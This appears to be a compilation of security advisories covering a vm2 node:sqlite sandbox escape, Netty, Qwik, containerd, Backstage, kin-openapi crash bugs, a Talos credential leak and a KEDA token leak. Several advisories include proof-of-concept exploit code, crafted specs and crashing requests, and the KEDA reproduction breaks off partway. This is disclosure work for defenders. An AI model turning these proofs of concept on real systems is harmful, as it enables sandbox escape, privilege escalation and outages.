cwe.name: Improper Control of Generation of Code ('Code Injection')

cves.summary:
### Summary

vm2 3.11.6 exposes Node.js's host `node:sqlite` module to `NodeVM` code when that builtin is allowed explicitly or through `builtin: ['*']`. The module is wrapped as read-only, but callable methods retain host-process authority. A sandboxed plugin can construct an in-memory database with extension loading enabled and call `DatabaseSync.loadExtension()` on a native library bundled in the plugin directory.

SQLite loads the library into the Node.js host process and invokes its native extension entry point. This gives the untrusted plugin arbitrary native code execution outside the sandbox.

The exploit needs only the `node:sqlite` builtin and a compatible native library already present in the untrusted plugin package. It does not require `fs`, `process`, `module`, `child_process`, `worker_threads`, `vm`, `inspector`, vm2 nesting, or an existing database file.

### Details

The vulnerable boundary spans the builtin inventory, resolver, runtime loader, and generic read-only wrapper.

On current Node.js versions, the builtin inventory contains the literal name `node:sqlite`. vm2 admits that name when it is explicitly configured or when the wildcard allowlist is expanded:

```js
const BUILTIN_MODULES = module.builtinModules.filter(/* denylist checks */);
```

The resolver then treats every request beginning with `node:` as a core-module request, even if the complete request string is not an allowlist key:

```js
if (x.startsWith('node:') || this.builtins.has(x)) {
  return x;
}
```

The sandbox runtime removes exactly one `node:` prefix and looks up the remainder in the configured builtin map:

```js
if (filename.startsWith('node:')) {
  id = filename.slice(5);
  return loadBuiltinModule(id);
}
```

Consequently, the sandbox spelling below resolves to the configured map entry `node:sqlite`:

```js
require('node:node:sqlite')
```

The default builtin loader imports the real module in the host realm and exposes it through `vm.readonly()`:

```js
builtins.set(key, vm => vm.readonly(hostRequire(key)));
```

Read-only wrapping prevents property assignment. It does not remove dangerous callable capabilities. Calls to `DatabaseSync` and `loadExtension()` are forwarded to the host implementation.

The complete exploit flow is:

```text
attacker supplies an untrusted plugin package containing JavaScript and a native library
  -> host runs the JavaScript in NodeVM with node:sqlite allowed
  -> plugin resolves the host module as node:node:sqlite
  -> plugin creates an in-memory DatabaseSync with allowExtension enabled
  -> plugin derives the bundled library path from its own __dirname
  -> plugin calls database.loadExtension(libraryPath)
  -> vm2 forwards the call to host SQLite
  -> SQLite loads the library into the Node.js host process
  -> SQLite invokes the library's native extension entry point
  -> attacker native code executes with the host process's privileges
```

The path does not need to be read through a sandboxed filesystem API. CommonJS already supplies the plugin's own directory, so an attacker can concatenate `__dirname` with the known name of a bundled library. The host necessarily places the untrusted plugin package on disk before evaluating its JavaScript.

### PoC

The attached PoC is local and harmless. Its native extension entry point writes one marker file and returns success. It does not launch a process, connect to a network service, or modify any other file.

Prerequisites: macOS, Node.js with `node:sqlite`, npm, and a C compiler.

1. Open the attached `poc` directory.
2. Install the exact affected package:

   ```bash
   npm install --ignore-scripts
   ```

3. Compile and run the proof:

   ```bash
   npm run poc
   ```

The script compiles `extension_probe.c` as `libvm2_sqlite_probe.dylib`, then runs `untrusted-plugin.js` in this restrictive configuration:

```js
new NodeVM({
  console: 'off',
  require: { builtin: ['node:sqlite'] },
});
```

The sandboxed plugin performs only:

```js
const { DatabaseSync } = require('node:node:sqlite');
const database = new DatabaseSync(':memory:', { allowExtension: true });
database.loadExtension(__dirname + '/libvm2_sqlite_probe.dylib');
database.close();
```

A vulnerable result is:

```json
{
  "sandboxResult": {
    "nativeExtensionLoaded": true,
    "usedOnlySQLiteBuiltin": true
  },
  "markerExists": true,
  "markerText": "VM2_SQLITE_EXTENSION_ENTRYPOINT_EXECUTED"
}
```

The marker is written from the compiled native extension entry point, not from JavaScript. `loadExtension()` also returns successfully, proving that SQLite both loaded the library and invoked its entry point.

### Impact

This is a sandbox escape to arbitrary native code execution. The native code runs inside the Node.js host process with the operating-system identity and privileges of that process, beyond all vm2 JavaScript, module, and proxy restrictions.

An attacker can replace the marker-only extension with native code that:

- reads application secrets, credentials, environment variables, and files available to the host account;
- modifies application data or executable files and establishes persistence;
- accesses internal services using the host's network identity;
- steals other tenants' data from the same process;
- terminates or corrupts the host process; and
- performs any other operating-system action permitted to the host account.

The realistic affected workflow is a plugin platform, automation service, notebook, build service, or multi-tenant code runner that stores attacker-supplied package contents and evaluates the package's JavaScript in `NodeVM` while allowing `node:sqlite` or all builtins. The attacker does not need pre-existing host execution, a writable database, or a command-execution builtin.

### Summary
A fragmented TLS ClientHello whose handshake header spans multiple records makes Netty silently fall back to the default SslContext; where per-SNI selection is the sole mTLS gate, an unauthenticated attacker can bypass the route's mTLS requirement.

### Details
In `io.netty.handler.ssl.SslClientHelloHandler#decode` the guard that should wait for the 4-byte handshake header checks the wrong offset - it ignores the 5-byte record header that precedes it - and therefore never fires:

```java
if (handshakeLength == -1) {
    if (readerIndex + 4 > endOffset) {
        // Need more data to read HandshakeType and handshakeLength (4 bytes)
        return;
    }
```

When the first record's payload is < 4 bytes, `handshakeLength = in.getUnsignedMedium(readerIndex + SslUtils.SSL_RECORD_HEADER_LENGTH + 1);` leads to `IndexOutOfBoundsException `. That is caught by the generic `catch (Exception)` block, which calls `select(ctx, null)` - this is the default `SslContext`. Fallback to default on parse failure is a problem when per-SNI selection is the sole mTLS gate.

### Impact
SNI routing bypass. Escalates to an unauthenticated mTLS bypass only when:
- mTLS is enforced solely via per-SNI SslContext (clientAuth=REQUIRE)
- the default/fallback SslContext is permissive (clientAuth=NONE/OPTIONAL)
- no secondary peer-certificate verification exists at the application layer.

### Summary

A Qwik server in the default configuration can be crashed with one unauthenticated HTTP request. During qwik-json body parsing, `ResourceSerializer.$fill$` does `Promise.resolve(resource._resolved)`. If `_resolved` is a plain object whose `.then` is a QRL for an unregistered symbol, the async QRL rejects, the rejection is orphaned, and Node terminates the process via its default unhandled-rejection policy.

### Impact

One unauthenticated request crashes the server. Looping keeps every replica dead as long as the attacker sends requests.

### Impact

A vulnerability in containerd's CRI implementation allows a container restored from an untrusted checkpoint via the `CreateContainer` API to bypass the destination security context and execute with elevated privileges. When restoring a container from a checkpoint archive or annotated OCI image, CRIU restores process credentials, Linux capabilities, `no_new_privs`, and seccomp state directly from checkpoint data rather than enforcing the destination CRI `ContainerConfig`. An attacker who can run a container with a crafted checkpoint image can execute processes as root with full capabilities and no enforced seccomp filters despite restrictive security policies requested by the orchestrator. Additionally, containerd's CRI status reporting reflects the requested configuration rather than the actual restored process state, masking the privilege discrepancy from orchestrators. This issue affects Linux systems running containerd with CRI checkpoint restore enabled; users not utilizing CRI checkpoint restore are not affected.

### Patches

This bug has been addressed in containerd 2.2.7 and 2.3.4 by disabling checkpoint restore via `CreateContainer` by default.  The feature has been removed entirely in containerd 2.4.0. Users should update to these versions to resolve the issue. Running containers that were restored from untrusted checkpoints should be stopped, deleted, and recreated.

Users who rely on restore via the `CreateContainer` API can re-enable the feature by setting the new `enable_experimental_restore_via_create` configuration option. However, enabling restore via `CreateContainer` leaves this vulnerability present, as containerd cannot enforce destination security policy during CRIU process restoration. 

### Workarounds

On unpatched versions, containerd does not provide a configuration option to disable checkpoint restore via `CreateContainer`. Deployments should restrict container creation permissions to trusted users, validate container image registries, or use admission controllers to reject images containing checkpoint data.

### References

* [CRIU image security](https://checkpoint-restore.github.io/criu/security/image-security.html)

### Credits

The containerd project would like to thank @l2yyd5 and @berkpolatCE for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)

To report a security issue in containerd:
* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)
* Email us at [security@containerd.io](mailto:security@containerd.io)

### Impact

An authenticated user could invoke actions that an operator had excluded through action configuration. Existing action permissions and downstream authorization remain enforced.

### Patches

Patched in `@backstage/backend-defaults` version `0.17.8`

### Workarounds

Limit access to action invocation endpoints to trusted service callers until upgrading.

## Summary

The fix for GHSA-p6wj-qrr4-pgh5 addressed a nil-pointer dereference that occurs when an OpenAPI 3.1 array schema omits the `items` keyword (which is legal under JSON Schema 2020-12). That fix patched three decoder paths: the standalone `parseArray` function, the top-level array check in `UrlencodedBodyDecoder`, and `MultipartBodyDecoder`.

Three additional crash paths were missed. All of them reach the unguarded `urlValuesDecoder.parseArray` method (`openapi3filter/req_resp_decoder.go:576`) or the unguarded array branch in `buildResObj` (line 1015):

1. **Query parameters** with `type: array` and no `items`.
2. **deepObject** query parameters containing an array property with no `items`.
3. **URL-encoded request bodies** where the array lives inside an `allOf` / `anyOf` / `oneOf` sub-schema. This path bypasses the guard added by the GHSA-p6wj-qrr4-pgh5 fix, because that guard only inspects top-level properties.

Each path is triggerable by an unauthenticated client and produces a deterministic nil-pointer panic during request validation.

## Details
### Root Cause

The three paths patched for GHSA-p6wj-qrr4-pgh5 each received a nil-`items` guard:

```go
// standalone parseArray (line 1143) -- GUARDED
func parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	if schemaRef.Value.Items == nil || schemaRef.Value.Items.Value == nil { ... }

// UrlencodedBodyDecoder top-level property loop (line 1441) -- GUARDED
if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil { ... }

// MultipartBodyDecoder (line 1587) -- GUARDED
if valueSchema.Value.Items == nil { ... }
```

But `urlValuesDecoder.parseArray` (line 576), which handles query-parameter and urlencoded-body array decoding, has **no** such guard:

```go
func (d *urlValuesDecoder) parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	var value []any
	for i, v := range raw {
		item, err := d.parseValue(v, schemaRef.Value.Items) // Items is nil -> panic in parseValue
```

`parseValue` immediately dereferences the schema it is handed:

```go
func (d *urlValuesDecoder) parseValue(v string, schema *openapi3.SchemaRef) (any, error) {
	if len(schema.Value.AllOf) > 0 {   // schema == nil here -> nil pointer dereference
```

For the deepObject path, `buildResObj` (line 1015) has the same gap. Its array branch recurses with `schema.Value.Items` (line 1028), which can be nil, and the recursive call dereferences it at line 1015:

```go
case schema.Value.Type.Is("array"):
	// ...
	for i := range arr {
		r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items) // nil Items
```

For the allOf body path, `UrlencodedBodyDecoder` validates only top-level `schema.Value.Properties` (line 1429-1449). But `decodeSchemaConstructs` (line 1474) recursively walks `AllOf` / `AnyOf` / `OneOf` sub-schemas and calls `decodeProperty` on their properties, which never pass through the top-level guard and reach `urlValuesDecoder.parseArray`.

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (cloned at tag `v0.144.0`, commit `f0407d5`)
- Go 1.26.7
- Each PoC calls `doc.Validate()` first to prove the spec is legal, then drives `openapi3filter.ValidateRequest` directly

### Path 1: Query parameter array without items

Spec (query param `ids` is `type: array`, no `items`), request `GET /test?ids=1&ids=2`:

```
Validate() ACCEPTED the spec (type: array with no items is legal under OAS 3.1)
Calling ValidateRequest directly (no net/http recover)...
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xc0000005 code=0x0 addr=0x20 ...]
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseValue(...)
	req_resp_decoder.go:605
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseArray(...)
	req_resp_decoder.go:580
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).DecodeArray(...)
	req_resp_decoder.go:569
...
github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
	validate_request.go:83
exit status 2
```

### Path 2: deepObject nested array without items

Spec (deepObject param `filter` with array property `tags`, no `items`), request `GET /test?filter[tags][0]=a`:

```
Validate() ACCEPTED the spec
Calling ValidateRequest directly...
panic: runtime error: invalid memory address or nil pointer dereference
github.com/getkin/kin-openapi/openapi3filter.buildResObj(...)
	req_resp_decoder.go:1012
github.com/getkin/kin-openapi/openapi3filter.buildResObj(...)   <- recursive call with nil Items
	req_resp_decoder.go:1028
github.com/getkin/kin-openapi/openapi3filter.makeObject(...)
	req_resp_decoder.go:947
...
exit status 2
```

### Path 3: URL-encoded body with array inside allOf (bypasses the existing fix)

Spec (urlencoded body, `allOf` sub-schema with array property `tags`, no `items`), request `POST /submit` body `tags=a&tags=b`:

```
Validate() ACCEPTED the spec
Calling ValidateRequest directly...
panic: runtime error: invalid memory address or nil pointer dereference
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseValue(...)
	req_resp_decoder.go:605
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseArray(...)
	req_resp_decoder.go:580
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).DecodeArray(...)
	req_resp_decoder.go:569
...
github.com/getkin/kin-openapi/openapi3filter.decodeProperty(...)   <- reached via decodeSchemaConstructs (allOf walker)
	req_resp_decoder.go:1519
exit status 2
```

The `decodeProperty` frame confirms the array was reached by walking the `allOf` sub-schema, bypassing the top-level guard that the GHSA-p6wj-qrr4-pgh5 fix added.

### Fix verification

Adding a single nil-`items` guard to `urlValuesDecoder.parseArray` (plus one to the `buildResObj` array branch) turns all three panics into clean validation errors:

```
poc1: Returned normally, err = parameter "ids" in query has an error: array items schema is required for decoding
poc2: Returned normally, err = parameter "filter" in query has an error: path tags: array items schema is required
poc3: Returned normally, err = <nil>   (no panic; the allOf property is skipped by the decoder)
```

This confirms `urlValuesDecoder.parseArray` is the shared root cause for Paths 1 and 3, and `buildResObj` for Path 2.

## Impact

An unauthenticated client can trigger a deterministic nil-pointer panic in request validation with a single crafted request, against any application that validates OAS 3.1 requests with `openapi3filter` where a spec declares an array without `items`.

The severity depends on the host:

| Deployment | Behavior | Availability impact |
|------------|----------|---------------------|
| Standard `net/http` server (validation runs in the handler goroutine) | `net/http` recovers the panic per-connection; the connection is dropped and the process survives | Per-request denial of service (A:L) |
| Non-`net/http` hosts (e.g. fasthttp/connect adapters) or validation performed in an application-spawned goroutine | The panic is not recovered; the process crashes | Full-process denial of service (A:H) |

This was verified in both configurations: under a live `net/http` server the process survived (the panic was logged as `http: panic serving ...` and the process exited 0 at end of test), while the direct-call PoCs above crashed the process with `exit status 2`.

## Summary

kin-openapi's spec loader and spec-time validator both handle circular schema references safely: the loader resolves circular `$ref`s on purpose (to support recursive data structures), and `Schema.validate()` uses stack-based cycle detection. `Validate()` therefore accepts a schema whose `allOf` / `anyOf` / `oneOf` chain refers back to itself, returning no error.

The runtime validators do not have that protection. When such a schema is used for request or response validation, the recursion through the combinator chain is unbounded. In Go this produces a **fatal stack overflow** (`runtime: goroutine stack exceeds ... limit` / `fatal error: stack overflow`), which is **not** a recoverable panic. `recover()` cannot catch it, so `net/http`'s per-connection recovery does not help. The entire process is terminated, including all goroutines serving unrelated clients.

Two independent unguarded recursion sites were confirmed:

1. `openapi3/schema.go` — `visitJSON` / `visitXOFOperations` (reached by `VisitJSON`, i.e. response validation and direct schema validation).
2. `openapi3filter/req_resp_decoder.go` — `decodeValue` (reached first during request parameter decoding). The report also identifies the same gap in `urlValuesDecoder.parseValue` and `buildResObj`/`buildFromSchemas`.

## Details 
### Root Cause

`Schema.validate()` has cycle detection (`openapi3/schema.go:1396`):

```go
func (schema *Schema) validate(ctx context.Context, stack []*Schema) ([]*Schema, error) {
	if slices.Contains(stack, schema) {
		return stack, nil
	}
	// ...
	stack = append(stack, schema)
```

The runtime visitor has none. `visitJSON` (line 1951) calls `visitXOFOperations` (line 2189), which iterates the combinator slice and calls `visitJSON` again on each sub-schema:

```go
func (schema *Schema) visitXOFOperations(settings *schemaValidationSettings, value any) (err error, run bool) {
	// ...
	for idx, item := range v { // v = schema.OneOf / AnyOf / AllOf
		v := item.Value
		// no check for item.Value == schema (or any ancestor)
		if err := v.visitJSON(settings, tempValue); err != nil { // recurses forever on a cycle
```

The request-decoding path has the same structure in `decodeValue` (`openapi3filter/req_resp_decoder.go:270`):

```go
func decodeValue(dec valueDecoder, param string, sm *openapi3.SerializationMethod, schema *openapi3.SchemaRef, required bool) (any, bool, error) {
	if len(schema.Value.AllOf) > 0 {
		for _, sr := range schema.Value.AllOf {
			value, f, err = decodeValue(dec, param, sm, sr, required) // no cycle check
```

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)
- Go 1.26.7

### Path A: response / direct schema validation (`VisitJSON`)

A schema whose `allOf` refers to itself. `Validate()` is called first to show the schema is accepted, then `VisitJSON()`:

```go
recursiveSchema := &openapi3.Schema{
	Type:       &openapi3.Types{"object"},
	Properties: openapi3.Schemas{"name": {Value: &openapi3.Schema{Type: &openapi3.Types{"string"}}}},
}
recursiveSchema.AllOf = openapi3.SchemaRefs{{Value: recursiveSchema}} // circular

_ = recursiveSchema.Validate(ctx)                       // accepted, no error
_ = recursiveSchema.VisitJSON(map[string]any{"name": "test"}) // crashes
```

Output:

```
Validate() ACCEPTED the circular schema (no error) -- spec-time cycle detection tolerates it
Calling VisitJSON() -- expect fatal stack overflow (unrecoverable)...
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow

goroutine 1 [running]:
github.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)
	openapi3/schema.go:1951
github.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)
	openapi3/schema.go:2309
github.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)
	openapi3/schema.go:1981
github.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)
	openapi3/schema.go:2309
... (repeats until stack overflow)
```

A `defer recover()` placed around the call did **not** catch the fatal error �� the process aborted with a non-zero exit code, confirming it is unrecoverable.

### Path B: HTTP request validation against a loaded spec (realistic delivery)

A legal OAS 3.0 spec with a circular `allOf` `$ref`, loaded normally, served behind a standard `net/http` handler using `openapi3filter.ValidateRequest`:

```yaml
openapi: '3.0.0'
info: { title: Circular allOf crash PoC, version: '1.0' }
paths:
  /test:
    get:
      parameters:
        - name: data
          in: query
          schema: { $ref: '#/components/schemas/Recursive' }
      responses: { '200': { description: OK } }
components:
  schemas:
    Recursive:
      type: object
      allOf:
        - $ref: '#/components/schemas/Recursive'
      properties:
        name: { type: string }
```

A single `GET /test?data=x` crashes the whole server process:

```
Validate() ACCEPTED the spec with circular allOf $ref
Sending GET /test?data=x through a real net/http server...
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow
...
github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	openapi3filter/req_resp_decoder.go:278
github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	openapi3filter/req_resp_decoder.go:278
... (repeats until stack overflow)
```

The line printed after the request ("the process survived") was never reached, and the process exited with a non-zero code — the standard `net/http` per-connection `recover()` did not save it. This is the key distinction from a recoverable panic: a fatal stack overflow takes the entire process down regardless of host.

### Fix verification

Adding stack-based cycle detection to both sites (matching `validate()`'s pattern) eliminated the crash:

- `visitJSON` guard: `VisitJSON()` returned normally instead of crashing.
- `decodeValue` guard: the same `GET /test?data=x` returned a clean `400`:

```
Response: 400 "invalid: parameter \"data\" in query has an error: circular schema reference detected while decoding"
If you see this line, the process survived.
```

## Impact

An unrecoverable, whole-process denial of service. Because the crash is a fatal Go runtime error (not a panic), it cannot be contained by `net/http`'s per-request recovery, so **A:H applies to all host types**, unlike a recoverable-panic bug.

Attack surface, in order of exposure:

- **Applications that load OpenAPI specs from untrusted or semi-trusted sources** (API gateways, spec linters/validators, mock servers, documentation generators). An attacker supplies a spec containing a circular combinator, and any subsequent request/response validation crashes the service. This is the primary remote-attacker scenario.
- **Applications serving a fixed, trusted spec that happens to contain a circular `allOf`/`anyOf`/`oneOf`.** Here any client request to the affected endpoint crashes the process. The spec author does not need malicious intent; a degenerate recursive combinator is enough. This is a latent reliability bug that becomes remotely triggerable once present.

## Summary

kin-openapi guards against `NaN` and `Inf` values in its built-in schema visitor (`visitJSON`) by returning `ErrSchemaInputNaN` / `ErrSchemaInputInf` when a `float64` input violates those constraints. For OAS 3.1 specs, however, `Schema.VisitJSON` routes through `useJSONSchema2020`, which hands the value directly to `santhosh-tekuri/jsonschema/v6` v6.0.2 without applying the same guard.

Inside `jsonschema/v6` v6.0.2, `numValidate` builds a `*big.Rat` from the input via `big.Rat.SetString(fmt.Sprintf("%v", v))`. For `NaN`/`Inf` this parse fails silently and returns `nil`. `numValidate` then dereferences the nil `*big.Rat` (in `math/big.(*Rat).Cmp`), producing a Go runtime panic.

An attacker delivers this by sending an HTTP request with `Content-Type: application/yaml` (or `application/x-yaml`) and a YAML body containing `.nan`, `.inf`, or `-.inf`. The `YamlBodyDecoder` decodes those tokens into `math.NaN()` / `math.Inf(±1)` (standard YAML 1.2 behavior), and they propagate to the unguarded `useJSONSchema2020` path whenever the schema declares a numeric constraint (`minimum`, `maximum`, `exclusiveMinimum`, `exclusiveMaximum`, or `multipleOf`).

## Details
### Root Cause

The built-in visitor `visitJSON` at `openapi3/schema.go:1968` guards NaN/Inf explicitly:

```go
case float64:
    if math.IsNaN(value) {
        return ErrSchemaInputNaN
    }
    if math.IsInf(value, 0) {
        return ErrSchemaInputInf
    }
```

For OAS 3.1 specs, `VisitJSON` dispatches to `useJSONSchema2020` (`openapi3/schema_jsonschema_validator.go:204`), which contains no such guard:

```go
func (schema *Schema) useJSONSchema2020(settings *schemaValidationSettings, value any) error {
    validator, err := newJSONSchemaValidator(schema)
    if err != nil {
        return schema.visitJSON(settings, value)
    }
    return validator.validate(value)      // value handed straight through
}
```

`jsonSchemaValidator.validate` calls `jsonschema/v6.Schema.Validate` (line 146), which reaches `numValidate` in v6.0.2. There, `big.Rat.SetString(fmt.Sprintf("%v", v))` returns `(nil, false)` for `NaN`/`Inf`, and the code dereferences the `nil` `*big.Rat` in `Rat.Cmp`, causing the panic.

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)
- santhosh-tekuri/jsonschema/v6 v6.0.2 (transitive dep)
- Go 1.26.7

### Spec

Minimal OAS 3.1 spec (`spec.yaml`) declaring a YAML body with a numeric constraint:

```yaml
openapi: '3.1.0'
info: { title: Test, version: '1.0' }
paths:
  /test:
    post:
      requestBody:
        required: true
        content:
          application/yaml:
            schema:
              type: number
              minimum: 0
      responses:
        '200': { description: OK }
```

### Trigger

A single `POST /test` with `Content-Type: application/yaml` and body `.nan`, `.inf`, or `-.inf`. All three variants panic:

```
=== RUN   TestNaNInf
[nan]    PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
[inf]    PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
[neginf] PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
```

### Panic stack trace (confirms exact chain)

```
panic: runtime error: invalid memory address or nil pointer dereference

math/big.(*Rat).Cmp(0x0, ...)                                       <- nil *big.Rat dereferenced
    C:/Program Files/Go/src/math/big/rat.go:492
github.com/santhosh-tekuri/jsonschema/v6.(*validator).numValidate(...)
    .../jsonschema/v6@v6.0.2/validator.go:525
github.com/santhosh-tekuri/jsonschema/v6.(*validator).validate(...)
    .../jsonschema/v6@v6.0.2/validator.go:168
github.com/santhosh-tekuri/jsonschema/v6.(*Schema).validate(...)
    .../jsonschema/v6@v6.0.2/validator.go:34
github.com/getkin/kin-openapi/openapi3.(*jsonSchemaValidator).validate(...)
    openapi3/schema_jsonschema_validator.go:146
github.com/getkin/kin-openapi/openapi3.(*Schema).useJSONSchema2020(...)   <- MISSING NaN/Inf guard
    openapi3/schema_jsonschema_validator.go:211
github.com/getkin/kin-openapi/openapi3.(*Schema).VisitJSON(...)
    openapi3/schema.go:1946
github.com/getkin/kin-openapi/openapi3filter.ValidateRequestBody(...)
    openapi3filter/validate_request.go:364
github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
    openapi3filter/validate_request.go:96
```

### net/http behavior (severity nuance)

Behind a standard `net/http` server, the panic is recovered per-connection. The client sees a dropped connection; the server process continues:

```
Sending POST /test body=.nan against real net/http server...
2026/08/25 http: panic serving 127.0.0.1:40625: runtime error: invalid memory address or nil pointer dereference
CLIENT ERROR (connection dropped): Post ".../test": EOF
Process still alive after request: true
```

This is a **recoverable panic**, unlike the recursion finding. `recover()` catches it (verified by capturing the panic value in a `defer` in the same goroutine). Non-`net/http` hosts or validation performed in an application-spawned goroutine are not covered by that recovery and would experience a full-process crash.

### Fix verification

Upgrading only the transitive dependency to `jsonschema/v6@v6.0.3` (via `go get github.com/santhosh-tekuri/jsonschema/v6@v6.0.3`) eliminates the panic entirely; all three payloads return a clean validation error:

```
[nan]    Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
[inf]    Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
[neginf] Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
```

This confirms the upstream `jsonschema/v6` v6.0.3 release treats the NaN/Inf case as a bug and fixes it at the source. It also confirms `useJSONSchema2020` is the reachable path: patching only the transitive dep removes the panic without touching kin-openapi code.

## Why This Is a Vulnerability, Not by Design

- The library explicitly refuses NaN/Inf in its own visitor (`ErrSchemaInputNaN` / `ErrSchemaInputInf` at `schema.go:1968`). The stated policy is: these values are not allowed.
- The OAS 3.1 dispatch (`useJSONSchema2020`) simply omits the same guard — a coding gap, not a design decision.
- Upstream `jsonschema/v6` v6.0.3 fixes the same case as a bug. Two independent code owners agree it should not panic.
- The trigger is a single HTTP request body an unauthenticated client can send. There is no legitimate content-authoring reason to submit `.nan` / `.inf` as a numeric field.

## Impact

- **Per-request denial of service (net/http hosts).** Every crafted request kills its own connection with zero attacker cost. Sustained flooding degrades service reliability and log noise.
- **Full-process denial of service (non-net/http hosts or goroutine-spawned validation).** No `net/http` recovery wrapper is present; the whole process crashes on a single request.
- **Attack surface is any OAS 3.1 API that accepts YAML bodies with numeric constraints.** These constraints (`minimum`, `maximum`, `exclusiveMinimum`, `exclusiveMaximum`, `multipleOf`) are common on any numeric field with a range.

cwe.name: Improper Check for Unusual or Exceptional Conditions

cves.summary:
### Summary
When generating a support bundle with `talosctl support` the credentials entered for private registries are included in the bundle.

### Details

Within the generated support bundle, inside `resources/registryconfigs.cri.talos.dev.yaml` the `auth` field of the spec is retained.
The same, potentially sensitive information is present within `etcfilespecs.files.talos.dev.yaml`.

### PoC

Simply run `talosctl -n [...] support` on a cluster with a `RegistryAuthConfig` resource 

### Impact

The problem itself is minor, however, anyone who has ever uploaded a support.zip bundle on a github issue, slack thread or public forum could have potentially leaked their internal authentication parameters for a private registry.

In most situations, if the network and credentials are set correctly, this should not be a problem. On the other hand, if the affected registry is publicly accessible, and the provided credentials have write access to it, this could lead to possibly serious consequences, from denial of service, to data loss and possibly existing tag hijacking leading to supply chain compromise, for the affected parties which were under the impression that the support bundle is redacted of sensitive information and thus can be shared publicly.

### Notes

Talos 1.14+ by default encrypts the support bundle to the age recipients specified (defaulting to siderolabs GitHub org members), so the impact is even lower.

### Environment

- Talos version: v1.13.0
- Kubernetes version: 1.35.3
- Platform: amd64

## Summary

A namespace admin who creates a `TriggerAuthentication` and a `ScaledObject` in their own namespace can make the KEDA operator send its own ServiceAccount token to a tenant-controlled URL. That token holds `["*"]/["*"] get` cluster-wide, so it reads every Secret in every namespace, plus `batch/jobs` and `horizontalpodautoscalers` create/delete cluster-wide, `*/scale` update on any workload, `validatingwebhookconfigurations` update (rewrite or disable cluster admission), and `apiservices` update (hijack aggregated API routing). This is effectively privilege escalation from namespace admin to cluster admin in real environments: a cluster-wide Secret read alone is enough to find a token for a more privileged ServiceAccount, and the cluster-wide `batch/jobs` create lets the attacker run a workload in any namespace whose Pod Security Admission level permits it (or that is PSA-exempt, such as `kube-system` , `kyverno`) to reach the node filesystem and a control-plane kubeconfig.

This is an incomplete fix of CVE-2025-68476: its content filter only requires the loaded file to be a JWT whose subject begins with `system:serviceaccount:`, which the operator's own projected token satisfies by construction. The destination field `hashiCorpVault.address` is unvalidated.

Finder credits: Artem Cherezov @cherez0ff, with Claude Opus 4.8

## Verified live

kind v1.31.2, kedacore/keda v2.20.0 (latest at the time of audit, <https://github.com/kedacore/keda>) installed from the unmodified release manifest `keda-2.20.0.yaml` (`ghcr.io/kedacore/keda:2.20.0`), default settings.

## Preconditions

1. The tenant holds `create` on `triggerauthentications.keda.sh` and `scaledobjects.keda.sh` in its own namespace (the documented KEDA tenant workflow), plus the built-in `edit` ClusterRole in that namespace. Often granted by a namespaced admin Role (`--verb='*' --resource='*.*'`) in multi-tenant environments.
2. KEDA is installed with default settings.

## Reproduction

### Cluster preparation (not part of the attack)

```sh
kind create cluster --image kindest/node:v1.31.2 --name keda-poc --kubeconfig ./kubeconfig
export KUBECONFIG=./kubeconfig

# Install KEDA v2.20.0 (unmodified vendor release manifest).
curl -sSL -o keda-2.20.0.yaml https://github.com/kedacore/keda/releases/download/v2.20.0/keda-2.20.0.yaml
kubectl apply --server-side -f keda-2.20.0.yaml
kubectl wait --for=condition=Established crd/triggerauthentications.keda.sh crd/scaledobjects.keda.sh --timeout=120s
kubectl -n keda rollout status deploy/keda-operator --timeout=180s

# Tenant identity: namespace admin in tenant-a.
kubectl create namespace tenant-a
kubectl -n tenant-a create serviceaccount tenant
kubectl -n tenant-a create rolebinding tenant-edit --clusterrole=edit --serviceaccount=tenant-a:tenant
kubectl -n tenant-a create role tenant-keda --verb=create,get --resource=triggerauthentications.keda.sh,scaledobjects.keda.sh
kubectl -n tenant-a create rolebinding tenant-keda --role=tenant-keda --serviceaccount=tenant-a:tenant

# Mint a tenant kubeconfig from a real TokenRequest token.
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
CA=$(kubectl config view --minify --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}')
TOKEN=$(kubectl -n tenant-a create token tenant --duration=24h)
cat > kubeconfig-tenant <<EOF
apiVersion: v1
kind: Config
clusters:
- name: kind
  cluster: { server: ${SERVER}, certificate-authority-data: ${CA} }
contexts:
- name: tenant
